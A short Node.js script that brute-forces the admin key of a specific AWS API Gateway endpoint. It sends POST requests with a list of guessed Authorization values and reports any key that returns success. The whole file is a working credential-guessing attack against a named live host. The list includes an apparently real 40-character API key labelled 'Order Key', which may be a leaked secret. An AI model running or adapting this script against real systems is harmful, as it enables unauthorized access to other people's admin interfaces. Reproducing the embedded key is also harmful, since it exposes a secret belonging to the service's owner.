const https = require('https');

const endpoint = { hostname: '0eeto6kblk.execute-api.ap-northeast-2.amazonaws.com', path: '/admin/Supernoba-admin', method: 'POST' };
const keys = [
    'S0cLXAGtuza6T3GbYZ8TBbERqfdi5Xo1ilA914gf', // Order Key
    'admin', 'supernoba', 'password', '1234', 'supernoba-admin', 
    'supernoba-secret', 'admin-secret', 'test-key',
    'supernoba-admin-key', 'admin123', 'system'
];

async function check(key) {
    const options = {
        hostname: endpoint.hostname,
        path: endpoint.path,
        method: endpoint.method,
        headers: { 
            'Authorization': key, 
            'Content-Type': 'application/json' 
        },
        timeout: 3000
    };

    return new Promise(resolve => {
        const req = https.request(options, res => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({ key, status: res.statusCode, data: data.substring(0, 100) }));
        });
        
        req.on('error', e => resolve({ key, error: e.message }));
        req.write(JSON.stringify({ symbol: 'TEST' })); // Payload
        req.end();
    });
}

(async () => {
    console.log('Brute-forcing POST Admin Key...');
    for (const k of keys) {
        const res = await check(k);
        console.log(`[${res.status}] Key '${k}' -> ${res.data}`);
        if((res.status === 200 || res.status === 201) && !res.data.includes('Forbidden') && !res.data.includes('error')) {
             console.log("!!! FOUND VALID KEY: " + k + " !!!");
             break;
        }
    }
})();
